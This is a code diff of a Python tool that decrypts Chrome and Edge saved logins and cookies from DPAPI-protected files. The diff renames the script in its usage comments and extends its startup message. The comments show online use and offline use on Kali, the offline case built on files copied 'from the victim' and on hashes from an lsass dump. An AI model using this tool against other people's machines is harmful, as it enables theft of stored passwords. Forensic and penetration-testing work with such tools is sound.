@@ -18,13 +18,13 @@
 ##       --> SID and HASH are from lsass.dmp, 'pypykatz lsa minidump lsass.dmp'), or the user password instead of the hash (no lsass dump needed then)
 ## -- Example for your online Windows machine:
 ##      Get your SID by looking at directory where the GUID file was found
-##    chrome_edge_dump_data.py -l "%localappdata%\Google\Chrome\User Data\Local State"
+##    chrome-edge-dec.py -l "%localappdata%\Google\Chrome\User Data\Local State"
 ##     and
-##    chrome_edge_dump_data.py -l "%localappdata%\Google\Chrome\User Data\Local State" -d "%localappdata%\Google\Chrome\User Data\Default\Login Data" -g "%appdata%\Microsoft\Protect\<SID>\<GUID>" -p "myPassword" -s <SID>
-##    chrome_edge_dump_data.py -l "%localappdata%\Edge\Chrome\User Data\Local State" -d "%localappdata%\Google\Edge\User Data\Default\Login Data" -g "%appdata%\Microsoft\Protect\<SID>\<GUID>" -p "myPassword" -s <SID>
+##    chrome-edge-dec.py -l "%localappdata%\Google\Chrome\User Data\Local State" -d "%localappdata%\Google\Chrome\User Data\Default\Login Data" -g "%appdata%\Microsoft\Protect\<SID>\<GUID>" -p "myPassword" -s <SID>
+##    chrome-edge-dec.py -l "%localappdata%\Edge\Chrome\User Data\Local State" -d "%localappdata%\Google\Edge\User Data\Default\Login Data" -g "%appdata%\Microsoft\Protect\<SID>\<GUID>" -p "myPassword" -s <SID>
 ## -- Offline example (e.g. Kali):
 ##      Copy Chrome 'Local State', Chrome 'Login Data' and Windows GUID File from the victim together with user SID and hash, put the 3 files in same directory as script
-##    chrome_edge_dump_data.py -l 'Local State' -d 'Login Data' -s S-1-5-21-7375663-6890924511-1272660413-2944159-1001 -g c6cabd99-988b-4aa3-9b1f-d689fa04011d -a da39a3ee5e6b4b0d3255bfef95601890afd80709 ## FYI: this is empty SHA1 hash
+##    chrome-edge-dec.py -l 'Local State' -d 'Login Data' -s S-1-5-21-7375663-6890924511-1272660413-2944159-1001 -g c6cabd99-988b-4aa3-9b1f-d689fa04011d -a da39a3ee5e6b4b0d3255bfef95601890afd80709 ## FYI: this is empty SHA1 hash
 
 ## TODO: maybe older MasterKey's are used, incorporate CREDHIST
 
@@ -45,7 +45,10 @@ sGUIDFile = sUserSID = sUserHash = sUserPass = None
 def parseArgs():
     global sLocalStateFile, sLoginDataFile, sCookiesFile, sMasterkey, sGUIDFile, sUserSID, sUserHash
     
-    print('[!] Welcome. To decrypt, one of three combo\'s is required: Master Key (alone) / GUID file, SID and User Hash / GUID file, SID and User Password')
+    print('[!] Welcome. To decrypt, one of three combo\'s is required: \n'
+          'Master Key (alone) / GUID file, SID and User Hash / GUID file, SID and User Password\n'
+          'Browser data can be found here:\n'
+          '%localappdata%\\Google\\Chrome\\User Data\\Local State')
     oParser = argparse.ArgumentParser()
     oParser.add_argument('-l', metavar='FILE', help='Path to Chrome/Edge Local State file', default='Local State')
     oParser.add_argument('-d', metavar='FILE', help='Path to Chrome/Edge Login Data file (optional)')
